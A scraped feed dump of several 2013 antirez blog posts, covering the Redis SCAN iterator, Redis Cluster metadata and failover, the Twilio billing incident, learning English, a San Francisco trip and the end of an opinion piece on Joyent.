<br>Maybe Joyent is thinking something like, you can’t go wrong if you fight sexism, or something like that, as I can’t believe they had a so naive reaction. Really, we have 10k years of culture for a reason, to be able to discriminate more than that, it is not 2+2=4.
<br>
<br>Probably Ben is not a sexist, maybe he believes simply that “him” does not make a difference in sexism every day. Everybody has his fight, and changing “him” in not the Ben fight, but possibly when Ben will have to evaluate a female candidate, he will use a truly meritocratic meter and WILL NOT GIVE A FUCK about the gender, like he did when refusing the pull request.
<br>
<br>You can’t bash people that don’t have your vision, and you can’t think that the fight against sexism is a free pass. Joyent, you are liable of your actions, and your actions violate more fundamental civil rights than you think.
<br>
<br>But the most disturbing thing is that companies act like that because of fear, the fear of the reaction of people that believe that the world is black or white, and that if you don’t see it the same color they see it, you are to blame, you are to crucify.
<a href=\"http://antirez.com/news/64\">Comments</a>" nil "http://antirez.com/news/64" "79a07379616fb24847bd2fcf6f430c1f") (16 (26588 31766 981701 101000) "http://antirez.com/news/63
" "Finally Redis collections are iterable " nil "Sun, 27 Oct 2013 15:47:10 +0000" "Redis API for data access is usually limited, but very direct and straightforward.
<br>
<br>It is limited because it only allows to access data in a natural way, that is, in a data structure obvious way. Sorted sets are easy to access by score ranges, while hashes by field name, and so forth.
<br>This API “way” has profound effects on what Redis is and how users organize data into it, because an API that is data-obvious means fast operations, less code and less bugs in the implementation, but especially forcing the application layer to make meaningful choices: the database as a system in which you are responsible of organizing data in a way that makes sense in your application, versus a database as a magical object where you put data inside, and then it will be able to fetch and organize data for you in any format.
<br>
<br>However most Redis data types, including the outer key-value shell if we want to consider it a data type for a moment (it is a dictionary after all), are collections of elements. The key-value space is a collection of keys mapped to values, as Sets are collections of unordered elements, and so forth.
<br>
<br>In most application logic using Redis the idea is that you know what member is inside a collection, or at least you know what member you should test for existence. But life is not always that easy, and sometimes you need something more, that is, to scan the collection in order to retrieve all the elements inside. And yes, since this is a common need, we have commands like SMEMBERS or HGETALL, or even KEYS, in order to retrieve everything there is inside a collection, but those commands are always a last-resort kind of deal, because they are O(N) operations.
<br>
<br>Your collection is very small? Fine, use SMEMBERS and you get Redis-alike performances anyway. Your collection is big? Don’t use O(N) commands if not for “debugging” purposes. A popular example is the misused KEYS command, source of troubles for non-experts, and top hit among the Redis slow log entries.
<br>
<br>Black holes
<br>===
<br>
<br>The problem is that because of O(N) operations, Redis collections, (excluding Sorted Sets that can be accessed by rank, in ranges, and in many other different ways), tend to be black holes where you put things inside, and you can hardly explore them again.
<br>
<br>And there are plenty of reasons to explore what is inside. For example garbage collection tasks, schema migration, or even fixing what is inside keys after an application bug corrupted some data.
<br>
<br>What we really needed was an iterator. Pieter Noordhuis and I were very aware of this problem since the early days of Redis, but it was a major design challenge because traditionally the deal is, you want a data structure to be iterable? Well, this is going to be a sorted tree-like data structure, with the concept of previous and next element.
<br>
<br>Instead most Redis data types are based on hash tables, and Redis hash tables are even of the most particular kind, as them automatically and incrementally resize, so sometime you even have two tables at the same time slowly exchanging elements from one to the other.
<br>
<br>Hash tables are cool because they have a good memory efficiency, and the constant-time access property. What we use is power-of-two sized hash tables, with chaining for collision handling, and this has worked pretty well so far. An indirect indicator is that sorted sets, the only data structure we have that is based on a tree-alike structure (skip lists) is measurably slower than others once elements start to pile up. While Log(N) is small, with million of elements it starts to be a big enough number that cache misses summed together make a difference.
<br>
<br>There was no easy way to say goodbye to hash tables.
<br>
<br>However eventually Pieter applied one of the most powerful weapons the designer has in its hands: sacrifice, and send me a pull request for a new SCAN command.
<br>
<br>The command was able to walk the key space incrementally, using a cursor that is returned back to the user after every call to SCAN, so it is a completely stateless affair. It is something like that:
<br>
<br>redis 127.0.0.1:6379> flushall
<br>OK
<br>redis 127.0.0.1:6379> debug populate 33
<br>OK
<br>redis 127.0.0.1:6379> scan 0
<br>1) \"52\"
<br>2)  1) \"key:29\"
<br>    2) \"key:13\"
<br>    3) \"key:9\"
<br>    4) \"key:12\"
<br>    5) \"key:28\"
<br>    6) \"key:30\"
<br>    7) \"key:26\"
<br>    8) \"key:14\"
<br>    9) \"key:21\"
<br>   10) \"key:20\"
<br>redis 127.0.0.1:6379> scan 52
<br>1) \"9\"
<br>2)  1) \"key:16\"
<br>    2) \"key:31\"
<br>    3) \"key:3\"
<br>    4) \"key:0\"
<br>    5) \"key:32\"
<br>    6) \"key:17\"
<br>    7) \"key:24\"
<br>    8) \"key:8\"
<br>    9) \"key:15\"
<br>   10) \"key:11\"
<br>
<br>… and so forth until the returned cursor is 0 again …
<br>
<br>This is possible because SCAN does not make big promises, hence the sacrifice: it guarantees to return all the elements that are in the collection from the start to the end of the iteration, at least one time.
<br>
<br>This means, for example, that:
<br>
<br>1) Elements may be returned multiple times.
<br>2) Elements added during the iteration may be returned, or not, at random.
<br>
<br>It turns out that this is a perfectly valid compromise, and that at application level you can almost always do what is needed to play well with this properties. Sometimes the operation you are doing on every element are simply safe to re-apply, some other times you can just put a flag in your (for example) Hash in order to mark it as processed, or a timestamp perhaps, and so forth.
<br>
<br>Eventually merged
<br>===
<br>
<br>Pieter did an excellent work, but the pull request remained pending forever (more than one year), because it relied on a complex to understand implementation. Basically in order to guarantee the previous properties with tables that can change from one SCAN call to the other, Pieter used a cursor that is incremented inverting the bits, in order to count starting from the most significant bits first. This is why in the example you see the returned cursor jumping forward and backward.
<br>
<br>This has different advantages, including the fact that it returns a small number of duplicates when possible (by checking less slots than a more naive implementation). Eventually I studied his code and tried to find a simpler algorithm with the same properties without success, so what I did is to document the algorithm. You can read the description here in the
<br>dict.c file: https://github.com/antirez/redis/blob/unstable/src/dict.c#L663
<br>
<br>After you do some whiteboard reasoning, it is not too hard to see how it works, but it is neither trivial, however it works definitely very well.
<br>
<br>So with the code merged into unstable, I tried to generalize the implementation in order to work with all the other types in Redis that can be iterated this way, that are Hashes, Sets and Sorted Sets, in the form of additional commands named HSCAN, SSCAN, ZSCAN.
<br>
<br>You may wonder why to have a ZSCAN. The reason is that while sorted sets are iterable in other ways, the specific properties of the SCAN iterator are not trivial to simulate by scanning elements by rank or score. Moreover sorted sets are internally implemented by a skiplist and an hash table, so we already had the hash table and to extend SCAN to sorted sets was trivial.
<br>
<br>Patterns too!
<br>===
<br>
<br>SCAN and its variants can be used with the MATCH option in order to only return elements matching a pattern. I’m also implementing the TYPE option in order to only return keys of a specific type.
<br>
<br>This is almost for free, since SCAN does not guarantees to return elements at all, so what happens is that it scans something like 10 buckets of the hash table per call (by default, you can change this) and later filters the output. Even if the return value contains no elements, you keep iterating as soon as the returned cursor is non-zero.
<br>
<br>As you can see this is something you could do client-side as well, by matching the returned elements with a pattern, but it is much faster to do it server side given that is a very common pattern, and one that users are already used to because of the KEYS command. And it requires less I/O of course, if the pattern only matches a small number of elements.
<br>
<br>This is an example:
<br>
<br>edis 127.0.0.1:6379> scan 0 MATCH key:1*
<br>1) \"52\"
<br>2) 1) \"key:13\"
<br>   2) \"key:12\"
<br>   3) \"key:14\"
<br>redis 127.0.0.1:6379> scan 52 MATCH key:1*
<br>1) \"9\"
<br>2) 1) \"key:16\"
<br>   2) \"key:17\"
<br>   3) \"key:15\"
<br>   4) \"key:11\"
<br>redis 127.0.0.1:6379> scan 9 MATCH key:1*
<br>1) \"59\"
<br>2) 1) \"key:10\"
<br>   2) \"key:1\"
<br>   3) \"key:18\"
<br>redis 127.0.0.1:6379> scan 59 MATCH key:1*
<br>1) \"0\"
<br>2) 1) \"key:19\"
<br>
<br>In the last call the returned cursor is 0, so we ended the iteration.
<br>
<br>Excited about it? I’ve good news, this is going to be back ported into 2.8 since it is completely self contained code so if it is broken, it does not affect other stuff. Well not just that, there are very big companies that are using SCAN for some time now, so I’m confident it’s pretty stable.
<br>
<br>Enjoy iterating!
<br>
<br>Discuss this blog post on Hacker News: https://news.ycombinator.com/item?id=6633091
<a href=\"http://antirez.com/news/63\">Comments</a>" nil "http://antirez.com/news/63" "c8850060d1bcf51cc699b2267d832990") (15 (26588 31766 981227 88000) "http://antirez.com/news/62
" "New Redis Cluster meta-data handling " nil "Thu, 26 Sep 2013 15:46:48 +0000" "This blog post describes the new algorithm used in Redis Cluster in order to propagate and update metadata, that is hopefully significantly safer than the previous algorithm used. The Redis Cluster specification was not yet updated, as I'm rewriting it from scratch, so this blog post serves as a first way to share the algorithm with the community.
<br>
<br>Let's start with the problem to solve. Redis Cluster uses a master - slave design in order to recover from nodes failures. The key space is partitioned across the different masters in the cluster, using a concept that we call \"hash slots\". Basically every key is hashed into a number between 0 and 16383. If a given key hashes to 15, it means it is in the hash slot number 15. These 16k hash slots are split among the different masters.
<br>
<br>At every single time only one master should serve a given hash slot. Slaves just replicate the master dataset so that it is possible to fail over a master and put the cluster again into an usable state where all the hash slots are served by one node.
<br>
<br>Redis Cluster is client assisted and nodes are not capable to forward queries to other nodes. However nodes are able to redirect a client to the right node every time a client tries to access a key that is served by a different node. This means that every node in the cluster should know the map between the hash slots and the nodes serving them.
<br>
<br>The problem I was trying to solve is, how to take this map in sync between nodes in a safe way? A safe way means that even in the event of net splits, eventually all the nodes will agree about the hash slots configuration.
<br>
<br>Another problem to solve was the slave promotion. A master can have multiple slaves, how to detect, and how to act, when a master is failing and a slave should be promoted to replace it?
<br>
<br>Metadata is not data
<br>====================
<br>
<br>In the case of Redis Cluster handling of metadata is significantly different than the way the user data itself is handled. The focus of Redis Cluster is:
<br>
<br>1) Speed.
<br>2) No need for merge operations, so that it is semantically simple to handle the very large values typical of Redis.
<br>3) The ability to retain most writes originating from clients connected to the majority of masters.
<br>
<br>Given the priorities, Redis Cluster, like the vanilla single node version of Redis, uses asynchronous replication where changes to the data set are streamed to slave nodes with an asynchronous acknowledgement from slaves. In other words when a node receives a write, the client most of the times directly talk with the node in charge for the key hash slot, and the node has no other chatting to do with other nodes.
<br>
<br>However this means that Redis Cluster is not a true CP system: there is a window where writes can be lost. The trivial case to lose a write is to write to a master that stops working after accepting our write and replying to the client, but before being able to propagate the write to its slaves.
<br>
<br>This window is very small, in the sub-millisecond range. However when a client is partitioned away from the majority of the master nodes there is a bigger window to lose data, as a partitioned master will continue to accept writes for some time, while on the majority side the same master may be failed over by a slave. So when the partition will be fixed, the master will be reconfigured as a slave and writes will be lost.
<br>
<br>Apart from the replicas, a key is stored into a single master node, so there is no need to agree or merge its value. Given the design, there is no need to use an agreement protocol in order to write or read data to/from the cluster. However metadata is a different story, we want that every node has a coherent vision of the cluster setup, and that the right configuration is eventually propagated to all the nodes even in case of failures and network partitions.
<br>
<br>Using an agreement algorithm
<br>============================
<br>
<br>The simplest way to solve such a problem is to use a consensus algorithm such as Paxos or Raft, and this was the direction I was going to take. However implementing consensus algorithms is hard. Actually it is so hard that often years are needed for implementations to stabilize.
<br>
<br>At some point I noticed something that makes the work of Redis Cluster nodes simpler, that is, information about hash slots is always idempotent. If hash slot 5 is served by A, and later because the configuration changes hash slot 5 is served by B, nodes don't need to know what happened, everything they need is that the configuration for an hash slot was updated.
<br>
<br>This changes everything basically: agreement protocols are able to take a state machine synchronized by running the same sequence of operations in every node. If the state machine is deterministic, then the internal state will be the same in all the nodes eventually. However all the state Redis Cluster needs, for a given slot, can be embedded into a single packet.
<br>
<br>Because of this we don't need a log of operations stored on disk, nor a way to make sure to fetch all the operations still not fetched, or to figure out what should be applied and what not, all the state can be copied in a single message. In short Redis Cluster does not require a full agreement protocol so I stolen just what I needed from Raft, and tried to figure out the rest.
<br>
<br>Failure detection
<br>=================
<br>
<br>In order to see if a node has issues, Redis Cluster still uses the old algorithm that is based on gossip. Nodes inform other nodes about the state of a few random nodes using ping / pong packets. These ping / pong packets are in turn used to check if a node is reachable from the point of view of the sender of the ping. If the (informal) majority of masters agree that a given node is not reachable, then the node is flagged as failing. I said \"informal\" as there is no true agreement here, but simply:
<br>
<br>1) Every node flags other nodes are failing if the majority of master nodes signaled the node as down in a given time range.
<br>2) Every node removes the flag if the node is back reachable and is a salve, or a master that after some time is still serving slots from our point of view (was not failed over).
<br>
<br>The failure detection is completely informal and has the only property that eventually all the nodes will agree on the failure: either the majority of nodes will mark it as failing resulting into a chain effect that will force all the other nodes to mark the node as failing, OR there is no majority and if the node is reachable again everybody will clear the flag.
<br>
<br>The point here is that the failure detection does not require any safety, it is only useful in order to trigger the safe part of the algorithm, that is, replacing the master with a slave and update the cluster configuration.
<br>
<br>Slave promotion
<br>===============
<br>
<br>Promoting a slave must be a safe operation, and one that should ensure that the configuration change is propagated across the cluster as soon as possible.
<br>
<br>Slave promotion is up to slaves and uses a mechanism very similar to the Raft algorithm leader election. This is what happens:
<br>
<br>1) A slave detects its master is failing.
<br>2) The slave will try to win the election in order to promote itself to master.
<br>3) If it is successful, it will change its state and will advertise the new configuration.
<br>4) If it is unsuccessful it will try again to win the election after some time.
<br>
<br>Every slave will try to start the election at a slightly different time in order to avoid a split brain condition that will require a new election. Redis Cluster uses a random delay that is driven by the number of seconds a slave was disconnected from the master, in order to favor slaves that were able to talk with the master more recently (slaves with too old data don't try at all to get elected).
<br>
<br>Every cluster node has the concept of currentTerm as in Raft, that is called currentEpoch in Redis Cluster. Every node tries to have a currentEpoch that is the highest found among other nodes, so this information is always added in ping /pong packets headers. Every time a node sees a currentEpoch of another node that is greater than its epoch, it updates its currentEpoch.
<br>
<br>The election is like Raft: a slave that tries to get elected increments its currentEpoch and sends a failover-auth-request to every master hoping to get its vote. Masters refuse to vote if the master instance of the slave is not failing from the point of view of a given master, or if the currentTerm advertised by the slave is smaller than the currentTerm of the receiving master.
<br>
<br>Also masters vote a single time for every epoch: this ensures that for every epoch we can have just a single winner, this is central both in the Raft algorithm and in the Redis Cluster slave election.
<br>
<br>Basically, if a slave wins the election, it uses the epoch at which the election was won as the version of its configuration, and newer configurations always win over older configurations.
<br>
<br>The configEpoch
<br>===============
<br>
<br>In order to make more clear how it works, we need to add some more information. Basically every ping / pong packet does not just publish the currentEpoch, but also the configEpoch, that is, the epoch at which the master started to serve its set of hash slots. Initially when a cluster is created every master uses a configEpoch of zero. As failover events happen, there will be nodes with greater configEpoch values.
<br>
<br>As in the old algorithm, the ping and pong packets also carry a bitmap with the hash slots served by a given node. Since every node knows the last observed configEpoch of every other node, it can detect configuration changes to incorporate.
<br>
<br>For instance if node B claims to serve hash slot 5 that was previously served by node A, but the configEpoch of node B is greater than the configEpoch we have for A, then we accept the new configuration.
<br>
<br>The same mechanism is also used in order to reconfigure a reappearing master as a slave, or to reconfigure all the other slaves after a failover. The old master's served slots count will drop to zero, and the nodes will switch as replicas of the node that is serving the slots now.
<br>
<br>The real algorithm used has more details that don't change the semantics, but make everything more fluid in common cases. For example after a slave wins an election it broadcasts a PONG to every node in order to make the configuration change faster, and to prevent other slaves from initiating a new useless election.
<br>
<br>Similarly a master that was partitioned out from the majority for enough time (the same time needed to flag it as failing) stop accepting writes, and will not accept writes for a few more seconds even after the majority of masters is reachable again, in order to give some time to the other nodes to inform it of configuration changes. This makes less likely that a client with an old routing table will try and succeed to write to the returning master that is now failed over.
<br>
<br>From the point of view of the code, the implementation is requiring a minor amount of code, as everything was already implemented in the old algorithm even if in a broken way, it was unsafe but the basic abstractions and message formats were ok.
<br>
<br>All in all I'm failing in love with distributed programming and I hope to learn more in the next weeks...
<a href=\"http://antirez.com/news/62\">Comments</a>" nil "http://antirez.com/news/62" "1fcfe9354427ef9104693b7bbf16373b") (14 (26588 31766 980689 602000) "http://antirez.com/news/61
" "English has been my pain for 15 years " nil "Sun, 01 Sep 2013 15:46:14 +0000" "Paul Graham managed to put a very important question, the one of the English language as a requirement for IT workers, in the attention zone of news sites and software developers [1]. It was a controversial matter as he referred to \"foreign accents\" and the internet is full of people that are just waiting to overreact, but this is the least interesting part of the question, so I'll skip that part. The important part is, no one talks about the \"English problem\" usually, and I always felt a bit alone in that side, like if it was a problem only affecting me, so in this blog post I want to share my experience about English.
<br>
<br>[1] http://paulgraham.com/accents.html
<br>
<br>A long story
<br>---
<br>
<br>I still remember me and sullivan (http://www.isg.rhul.ac.uk/sullivan/) both drunk in my home in Milan trying to turn an attack I was working on, back in 1998, in a post that was understandable for BUGTRAQ users, and this is the poor result we obtained: http://seclists.org/bugtraq/1998/Dec/79
<br>
<br>Please note the \"Instead all others\" in the second sentence. I'm still not great at English but I surely improved over 15 years, and sullivan now teaches in US and UK universities so I imagine he is totally fluent (spoiler warning: I'm still not). But here the point is, we were doing new TCP/IP attacks but we were not able to freaking write a post about it in English. It was 1998 and I already felt extremely limited by the fact I was not able to communicate, I was not able to read technical documentation written in English without putting too much efforts in the process of reading itself, so my brain was using like 50% of its energy to just read, and less was left to actually understand what I was reading.
<br>
<br>However in one way or the other I always accepted English as a good thing. I always advice people against translation efforts in the topic of technology, since I believe that it is much better to have a common language to document and comment the source code, and actually to obtain the skills needed to understand written technical documentation in English is a simple effort for most people.
<br>
<br>So starting from 1998 I slowly learned to fluently read English without making more efforts compared to reading something written in Italian.
<br>I even learned to write at the same speed I wrote stuff in Italian, even if I hit a local minima in this regard, as you can see reading this post: basically I learned to write very fast a broken subset of English, that is usually enough to express my thoughts in the field of programming, but it is not good enough to write about general topics. I don't know most of the words needed to refer to objects you find in a kitchen for example, or the grammar constructs needed to formulate complex sentences, hypothetical structures, and so forth. As I now can communicate easily in the topic I care most, and in a way that other people can more or less understand everything I write, the pressure to improve has diminished greatly… However I recently discovered that this was the minor of my problems with English.
<br>
<br>European English, that funny language
<br>---
<br>
<br>So while I managed to eventually write and read comfortably enough for my needs, I almost never experienced actual communication in an English speaking country until recently. Before that I always used English with other european (non UK) people, such as French, German, Spanish people.
<br>Now the English spoken in these countries is the English spoken at English school lessons… Phonetically it has almost nothing to do with American or UK English. They say it is \"BBC English\" but actually it is not. It is a phonetically greatly simplified English that uses UK English grammar.
<br>
<br>*That* version of English, actually allows people from around the world to communicate easily. The basic grammar is trivial to grasp, and in a few months of practice you can talk. The sound of the words is almost the same in all the non-UK speaking countries in Europe. So it works great.
<br>
<br>There is just one problem, it has nothing to do with the real English spoken in UK, US, Canada, and other countries where English is a native language.
<br>
<br>English is a bit broken, after all
<br>---
<br>
<br>Now I've a secret for you, that is everything but a secret except nobody says it in the context of English VS The World: English is a broken language, phonetically.
<br>In Italy we have a long history, but a very late political unification. Different regions talk different dialects, and people have super strong accents. Before 1950, when the \"TV Language Unification\" happened, everybody was still taking with their *dialects* and italian was only mastered by a small percentage of people. Sicilian itself, the language talked the most by my family, predates Italian by centuries (http://en.wikipedia.org/wiki/Sicilian_language*).
<br>
<br>Still, guess what, nobody has issues understanding one of another region, or even from a Switzerland canton. Italian is phonetically one of the simplest languages on the earth, and is full of redundancy. It has, indeed, a low information entropy and usually words are long with a good mix of consonants and vocals in every word. There are no special rules to pronounce a word, if you know the sound of every single letter, plus the sound of a few special combination of letters like \"gl<vocal>\", \"sc<vocal>\", you can basically pronounce 99.9% of the words correctly just reading them for the first time.
<br>
<br>The fact that people from different English speaking countries have issues communicating is already a big hint about how odd is English phonetically.
<br>For instance for me and many other non native English speakers it is very very very hard to understand what the fuck an UK people is telling. North Americans are a lot simpler usually.
<br>
<br>Because of this \"feature\" of English the problem for me is not just my accent, that is IMHO the simplest thing to fix if I'll try to fix it putting enough work into it, but the ability to understand what people are saying to me. IMHO the fact that Paul Graham refers to \"accents\" is a bad attitude of UK/US people in this regard, hey guys, you are not understanding us, we are not understanding what you say as well, and it is hard to find people that, once your understanding limits are obvious, will try to slow down the pace of the conversation. Often even if I say I did not understand, I'll get the same sentence repeated the same at speed of light.
<br>
<br>Learning written english as a first exposure is the killer
<br>---
<br>
<br>In my opinion one fact that made me so slow learning English is the fact that I started reading English without never ever listening to it.
<br>My brain is full of associations between written words and funny sounds that really don't exist in the actual language.
<br>My advice is that if you are learning English now, start listening as soon as possible to spoken English.
<br>
<br>The osx \"say\" program is a good assistant, it is able to pronounce in a decent way most English words. NEVER learn a new word without learning what is its sound.
<br>
<br>Introvert or extrovert?
<br>---
<br>
<br>One of the things that shocked me the most with my experience with the English language is how not mastering a language can switch you into an introvert. I'm an extrovert in Italy where most people are extroverts, in Sicily where there are even more extroverts, and inside my family that is composed mostly of extroverts. I'm kinda of an attention whore I guess (I hope I'm not, actually, but well, I'm very extrovert). Now when I have to talk in English, I'm no longer an extrovert anymore because of the communication barrier, and I regret every time I've to go to a meeting, or to be introduced to another person. It is a nightmare.
<br>
<br>It's too late, let's study English
<br>---
<br>
<br>English in my opinion is only simple grammatically, but is a bad pick as a common language. However the reality is, it already won, there is no time to change it, and it is a great idea to talk in English better, even if this means to put a lot of efforts into it. This is what I'm doing myself, I'm trying to improve.
<br>
<br>Another reason I find myself really in need to improve my English is that in 10 years I'll likely no longer write code professionally, and a logical option is to switch into the management side of IT, or to handle big projects where you are not supposed to write the bulk of the code. Well, if you think you need English as a developer, you'll need it a lot more as you go in other divisions of a typical IT company, even if you \"just\" have to actually manage many programmers.
<br>
<br>However as a native English speaker you should really realize that a lot of people are doing serious efforts to learn a language that is hard to learn: it is not an hobby, to master English is a big effort that a lot of people are trying to do to make communication simpler. Without to mention how trivial is to go back in the learning process as long as you stop talking / listening for a couple of weeks…
<br>
<br>My long term hope is that soon or later different accents could converge into a standard easy-to-understand one that the English speaking population could use as a lingua franca.
<a href=\"http://antirez.com/news/61\">Comments</a>" nil "http://antirez.com/news/61" "f919319622019b15db32258e7cb11aaf") (13 (26588 31766 980221 192000) "http://antirez.com/news/60
" "Twilio incident and Redis " nil "Tue, 23 Jul 2013 15:45:52 +0000" "Twilio just released a post mortem about an incident that caused issues with the billing system:
<br>
<br>http://www.twilio.com/blog/2013/07/billing-incident-post-mortem.html
<br>
<br>The problem was about a Redis server, since Twilio is using Redis to store the in-flight account balances, in a master-slaves setup, with multiple slaves in different data centers for obvious availability and data safety concerns.
<br>
<br>This is a short analysis of the incident, what Twilio can do and what Redis can do to avoid this kind of issues.
<br>
<br>The first observation is that Twilio uses Redis, an in memory system, in order to save balances, so everybody will say \"WTF Twilio! Are you serious with your data?\". Actually Redis uses memory to serve data and to internally manipulate its data structures, but the incident has *nothing to do* with the durability of Redis as a DB. In fact Twilio stated that they are using the append only file that can be a very durable solution as explained here: http://oldblog.antirez.com/post/redis-persistence-demystified.html
<br>
<br>The incident is actually centered around two main aspects of Redis:
<br>
<br>1) The replication system.
<br>2) The configuration.
<br>
<br>I'll address they two things respectively.
<br>
<br>Analysis of the replication issue
<br>===
<br>
<br>Redis 2.6 always needs a full resynchronization between a master and a slave after a connection issue between the two.
<br>Redis 2.8 addressed this problem, but is currently a release candidate, so Twilio had no way to use the new feature called \"partial resynchronization\".
<br>
<br>Apparently the master became unavailable because many slaves tried to resynchronize at the same time.
<br>
<br>Actually for the way Redis works a single slave or multiple slaves trying to resynchronize should not make a huge difference, since just a single RDB is created. As soon as the second slave attaches and there is already a background save in progress in order to create the first RDB (used for the bulk data transfer), it is put in a queue with the previous slave, and so forth for all the other slaves attaching. Redis will just produce a single RDB file.
<br>
<br>However what is true is that Redis may use additional memory with many slaves attaching at the same time, since there are multiple output buffers to \"record\" to transfer when the RDB file is ready. This is true especially in the case of replication over WAN. In the Twilio blog post I read \"multiple data centers\" so it is possible that the replication process may be slow in some case.
<br>
<br>The bottom line is, Redis normally does not need to go slow when multiple slaves are resynchronizing at the same time, unless something strange happens like hitting the memory limit of the server, with the master starting to swap and/or problems with very slow disks (probably EC2?) so that creating an RDB starts to mess with the ability to write to the AOF file.
<br>
<br>However issues writing to the AOF are a bit unlikely to be the cause, since during the AOF rewrite there is the same kind of disk i/o stress, with one thread writing a lot of data to the new AOF, and the other (main) thread logging every new write to the AOF. Everything considered memory pressure seems more probable, but Twilio engineers can just comment with details about what happened, this will be an useful real-world data point for sure.
<br>
<br>From the Twilio side, what is possible to do to minimize incidents, is to understand exactly why the master is not able, with the current architecture, to survive without serious loss of performance to many slaves resynchronizing.
<br>
<br>From the Redis side, well, we had to do our homework and provide partial resynchronization *long time ago* probably, we finally have it in Redis 2.8, and it is very good that a few days ago I pushed forward the 2.8 release skipping all the other pending features for this release that will be postponed for the next release. Now we have the first release candidate, in a few weeks this should be a release in the hands of users.
<br>
<br>The configuration
<br>===
<br>
<br>The other obvious problem, probably the biggest one, was restarting the master with the wrong configuration.
<br>
<br>Again I think here there was an human error that was \"helped\" by a Redis non perfect mechanism.
<br>
<br>Basically up to Redis 2.6 you had CONFIG SET to change the configuration by hand, so it was possible for example to switch the system from RDB to AOF for more data safety with just:
<br>
<br>redis-cli CONFIG SET appendonly yes
<br>
<br>However you had to change the configuration file manually in order to ensure that the change will affect the instance after the next restart. Otherwise the change is only in the current in memory configuration and a restart will bring you back to the old config.
<br>
<br>Maybe this was not the case, but it is not unlikely that Twilio engineers modified the wrong redis.conf file or forgot to do it in some way.
<br>
<br>Fortunately Redis 2.8 provides a better workflow for on-the-fly configuration changes, that is:
<br>
<br>redis-cli CONFIG SET appendonly yes
<br>redis-cli CONFIG REWRITE
<br>
<br>Basically the config rewriting feature will make sure to change the currently used configuration file, in order to contain the configuration changes operated by CONFIG SET, which is definitely safer.
<br>
<br>In the end
<br>===
<br>
<br>I'll be happy to work with the Twilio engineers in the next weeks in order to understand the details and their requests and see how Redis can be improved to make incidents like this less likely to happen.
<br>
<br>A real world test
<br>===
<br>
<br>I just tried to setup a master with AOF enabled, rotating disks, and a huge write load. Only trick is, it is bare metal entry-level hardware.
<br>
<br>Then I put a steady load on it of 70k writes per second across 10 millions of keys.
<br>
<br>Finally I tried to mass-resync four slaves form scratch multiple times.
<br>
<br>Results:
<br>
<br>$ redis-cli -h 192.168.1.10 --latency-history
<br>min: 0, max: 26, avg: 0.97 (1254 samples) -- 15.00 seconds range
<br>min: 0, max: 5, avg: 0.66 (1287 samples) -- 15.00 seconds range
<br>min: 0, max: 2, avg: 0.62 (1290 samples) -- 15.00 seconds range
<br>min: 0, max: 1, avg: 0.47 (1307 samples) -- 15.01 seconds range
<br>min: 0, max: 10, avg: 0.48 (1306 samples) -- 15.00 seconds range
<br>min: 0, max: 1, avg: 0.47 (1310 samples) -- 15.01 seconds range
<br>min: 0, max: 3, avg: 0.45 (1311 samples) -- 15.01 seconds range
<br>min: 0, max: 10, avg: 0.48 (1305 samples) -- 15.01 seconds range
<br>min: 0, max: 23, avg: 0.49 (1306 samples) -- 15.01 seconds range
<br>min: 0, max: 3, avg: 0.47 (1307 samples) -- 15.01 seconds range
<br>min: 0, max: 36, avg: 0.86 (1255 samples) -- 15.00 seconds range
<br>min: 0, max: 6, avg: 1.05 (1246 samples) -- 15.01 seconds range
<br>min: 0, max: 21, avg: 0.52 (619 samples)^C
<br>
<br>As you can see there is no moment in which the server struggles with this load. During the test the load continued to be accepted at the rate of 70k writes/sec.
<br>
<br>This test is in no way able to simulate the Twilio architecture, but the bottom line here is, Redis is supposed to handle this well with minimally capable hardware so something odd happened, or there was a low memory condition, or there was the \"EC2 effect\", that is, some very poor disk performance allowed for memory pressure.
<a href=\"http://antirez.com/news/60\">Comments</a>" nil "http://antirez.com/news/60" "743900799d4b45f69479c83954f50893") (12 (26588 31766 979857 707000) "http://antirez.com/news/59
" "San Francisco " nil "Sat, 15 Jun 2013 15:45:31 +0000" "Yesterday night I returned back home after a short trip in San Francisco. Before memory fades out and while my feelings are crisp enough, I'm writing a short report of the trip. The point of view is that of a south European programmer exposed for a few days to what is probably the most active information technology ecosystem and economy of the world.
<br>
<br>Reaching San Francisco
<br>===
<br>
<br>If you want to reach San Francisco from Sicily, there are no direct flights helping you. My flight was a Lufthansa flight from Catania to Munich, and finally from Munich to San Francisco. This is a total of 15 hours flight, plus the stop in Munich waiting for the second flight.
<br>
<br>Unfortunately the first flight had a delay big enough that I lost my connection. My trip was already pretty short, just four days, and this issue costed me one day reducing the total available time in SF to just 3 days... It's like to go to the other side of the world just to take a coffee.
<br>
<br>However it's very rewarding to see Germans having an issue with precision, so I blamed a lot of people with the most heavy of the Sicilian accent... Just kidding :-) The reality is that the operators at the Catania airport, not payed by Lufthansa, said that among all the big operators Lufthansa is one of the best in terms of avoiding delays. Moreover in Munich I was \"protected\" in a nice enough hotel with good food and great beer.
<br>
<br>I was not the only unlucky guy, there were other three north Americans headed to San Francisco that became my journey friends in no time, very cool people that allowed me to practice English some hours before reaching SF, recounted fun stories, and got drunk with me in the Munich -> SF flight.
<br>
<br>Basically it's a long trip, and reaching the final destination is already an experience in itself. A direct flight would be much better: only one flight, and the process is \"atomic\", either you remain at the starting point or you get to the final destination, no chances to remain half-way unless the aircraft falls on the floor ;-)
<br>
<br>The city
<br>===
<br>
<br>I'm a \"City guy\". In Sicily I live near Catania, that counting all the conurbation is like 1 million of inhabitants, not a lot but not a small town. San Francisco from this point of view is like my ideal city: people outside, gardens, large streets, bike lanes, many places where you can have a meal, and shops.
<br>
<br>The Hotel, the Intercontinental in Howard street, was also great in every possible way, from the food to the staff that was always very professional and willing to help. The only bad thing about the Hotel was the gym, full of treadmills, without a pull-up bar, no barbells. A strange conception of fitness... I had to survive many days without doing a single deadlift.
<br>
<br>During my permanence in SF I used a cab only two times for time constraints, I enjoyed a lot to walk around the city.
<br>
<br>The people
<br>===
<br>
<br>During my time in SF I had the pleasure to visit Pivotal (my company), Adroll, Apcera, Twitter, and to attend the Redis drink up. I encountered an endless stream of smart *and* kind people, basically without exceptions. I assume that the SF guys not following The First Law Of Computing (that is \"don't be an asshole\") that I have the pleasure to meet on Twitter from time to time are a minority in the city.
<br>
<br>Basically is a fantastic environment where the focus is only on getting things done in a friendly way, without rigid and useless things like the need to reach the office at 8am, but also without the employee habit of disappearing at 5pm during a deployment just because it's time to go home.
<br>
<br>This is my philosophy as well, and it resonates very well with the way I also work at home.
<br>
